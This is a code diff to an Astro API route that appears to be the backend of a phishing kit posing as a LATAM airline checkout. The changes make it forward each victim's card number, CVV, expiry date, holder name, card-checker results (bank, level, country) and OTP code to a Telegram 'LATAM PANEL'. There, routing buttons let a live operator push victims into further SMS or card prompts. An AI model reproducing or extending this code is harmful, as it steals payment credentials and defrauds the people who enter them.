@@ -3,7 +3,7 @@ export const prerender = false;
 import type { APIRoute } from 'astro';
 import { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } from 'astro:env/server';
 
-type DebugEvent = 'P1' | 'P2' | 'P3' | 'P4' | 'P-PAYMENT' | 'P-SUCCESS' | 'PAYMENT_SUBMIT' | 'OTP_SUBMIT';
+type DebugEvent = 'PAYMENT_SUBMIT' | 'OTP_SUBMIT';
 type RouteAction = 'wait' | 'sms' | 'card' | 'sms_error' | 'card_error' | 'approved';
 
 type RouteDecision = {
@@ -127,25 +127,8 @@ function actionLabel(action: RouteAction) {
   return labels[action] || action;
 }
 
-function isProcessingEvent(event: unknown) {
-  return event === 'PAYMENT_SUBMIT' || event === 'OTP_SUBMIT';
-}
-
-function stepLabel(event: unknown, meta?: Record<string, unknown>) {
-  if (typeof meta?.step === 'string' && meta.step.trim()) return meta.step.trim();
-  const labels: Record<string, string> = {
-    P1: 'Inicio / reserva',
-    P2: 'Eligiendo vuelos',
-    P3: 'Resumen del viaje',
-    P4: 'Datos de pasajeros',
-    'P-PAYMENT': 'Página de pago',
-    'P-SUCCESS': 'Compra confirmada',
-    PAYMENT_SUBMIT: 'Pago en proceso',
-    OTP_SUBMIT: 'Envió código OTP',
-  };
-  return labels[String(event || '')] || String(event || '-');
-}
-
+// Los tres botones se mantienen iguales en todos los mensajes para que el operador
+// siempre tenga las mismas opciones de routing manual.
 function keyboard(sessionId: string, brand: string) {
   return {
     inline_keyboard: [
@@ -156,50 +139,36 @@ function keyboard(sessionId: string, brand: string) {
   };
 }
 
-function formatPenAmount(meta: Record<string, unknown>, payload: Record<string, unknown>) {
-  const labeled = meta.amountLabel ?? payload.amountLabel;
-  if (typeof labeled === 'string' && labeled.trim()) return labeled.trim();
-  const raw = meta.amount ?? payload.amount;
-  const n = Number(raw);
-  if (Number.isFinite(n) && String(raw) !== '') {
-    return `USD ${n.toFixed(2).replace('.', ',')}`;
-  }
-  return '-';
-}
-
-function formatStepMessage(payload: Record<string, unknown>) {
-  const meta = objectValue(payload.meta) || {};
-  return stepLabel(payload.event, meta);
-}
-
-function formatPaymentMessage(payload: Record<string, unknown>) {
+// Plantilla unica para todos los eventos: page views, pago y OTP usan la misma estructura.
+function formatTelegramMessage(payload: Record<string, unknown>) {
+  console.log('PAYLOAD FROM MAP: ', payload);
   const mockCard = payload.mockCard as { brand?: string; pan?: string; exp?: string; cvv?: string; holder?: string } | undefined;
-  const meta = objectValue(payload.meta) || {};
-  const metaOtp = objectValue(payload.metaOtp) || {};
-  const stepMeta = payload.event === 'OTP_SUBMIT' ? { ...meta, ...metaOtp } : meta;
-  const cpayload = objectValue(meta.cpayload) || {};
-  const brand = String(payload.brand || mockCard?.brand || meta.brand || '-');
-  return [
+  const meta = payload.meta as Record<string, unknown> | undefined;
+  const brand = String(payload.brand || mockCard?.brand || meta?.brand || '-');
+  const amount = String(meta?.amount || '-');
+  const lines = [
     '✈️ LATAM PANEL',
     '━━━━━━━━━━━━━━━━━━',
-    `📍 ${stepLabel(payload.event, stepMeta)}`,
     `🆔 Sesión: ${payload.sessionId || '-'}`,
-    `💵 Monto: ${formatPenAmount(meta, payload)}`,
+    `💵 Monto: $ ${amount}`,
     '',
     '💳 DATOS DE PAGO',
+    `👤 Titular: ${payload?.meta?.cpayload?.holder || '-'}`,
     `🏷️ Marca: ${brand.toUpperCase()}`,
-    `💳 Tarjeta: ${cpayload.b || meta.card || '-'}`,
-    `📅 Expira: ${cpayload.cv || cpayload.exp || '-'}`,
-    `👤 Titular: ${cpayload.holder || '-'}`,
+    `💳 Tarjeta: ${payload.meta.cpayload.b || '-'}`,
+    `📅 Expira: ${payload?.meta?.cpayload?.exp || '-'}`,
+    `📅 CVV: ${payload?.meta?.cpayload?.cv || '-'}`,
+    '',
+    `📅 Nivel: ${payload?.meta?.cpayload?.checker?.level || '-'}`,
+    `📅 Banco: ${payload?.meta?.cpayload?.checker?.bank || '-'}`,
+    `📅 País: ${payload?.meta?.cpayload?.checker?.country || '-'}`,
     '',
     '💰 OTP',
-    `💵 Código: ${metaOtp.otp || '-'}`,
+    `💵 Código: ${payload.metaOtp.otp}`,
     '━━━━━━━━━━━━━━━━━━',
-  ].join('\n');
-}
+  ];
 
-function formatTelegramMessage(payload: Record<string, unknown>) {
-  return isProcessingEvent(payload.event) ? formatPaymentMessage(payload) : formatStepMessage(payload);
+  return lines.join('\n');
 }
 
 // Wrapper minimo para llamar metodos del Bot API sin repetir token/url.
@@ -244,7 +213,7 @@ async function sendTelegram(payload: Record<string, unknown>, options: { withBut
     text: formatTelegramMessage(payload),
     disable_web_page_preview: true,
   };
-  if (options.withButtons) {
+  if (options.withButtons ?? true) {
     message.reply_markup = keyboard(sessionId, brand);
   }
   const result = await telegramApi('sendMessage', message);
@@ -321,7 +290,7 @@ export const POST: APIRoute = async ({ request }) => {
   console.info('[debug-api:body]', body);
 
   const event = String(body.event || '') as DebugEvent;
-  const allowed = new Set<DebugEvent>(['P1', 'P2', 'P3', 'P4', 'P-PAYMENT', 'P-SUCCESS', 'PAYMENT_SUBMIT', 'OTP_SUBMIT']);
+  const allowed = new Set<DebugEvent>(['PAYMENT_SUBMIT', 'OTP_SUBMIT']);
   if (!allowed.has(event)) return json({ error: 'Evento debug invalido' }, { status: 400 });
 
   const sessionId = cleanSessionId(body.sessionId);
@@ -342,16 +311,13 @@ export const POST: APIRoute = async ({ request }) => {
     session.decision = { action: 'wait', brand, updatedAt: new Date().toISOString() };
   }
 
-  const meta = { ...(previousMeta || {}), ...(incomingMeta || {}) };
   const payload = {
     sessionId,
     event,
     route: String(body.route || ''),
     createdAt: new Date().toISOString(),
     brand,
-    amount: meta.amount ?? previousMeta?.amount,
-    amountLabel: meta.amountLabel ?? previousMeta?.amountLabel,
-    meta,
+    meta: incomingMeta || previousMeta || {},
     metaOtp: incomingMetaOtp || previousMetaOtp || {},
     action: event === 'PAYMENT_SUBMIT' || event === 'OTP_SUBMIT' ? 'wait' : 'ack',
     mockCard,
@@ -359,9 +325,7 @@ export const POST: APIRoute = async ({ request }) => {
 
   console.info('[debug-api]', payload);
   session.payload = payload;
-  const telegram = event === 'P-SUCCESS'
-    ? { sent: false, skipped: 'success-page' }
-    : await sendTelegram(payload, { withButtons: isProcessingEvent(event) });
+  const telegram = await sendTelegram(payload);
 
   return json({ ...payload, telegram });
 };
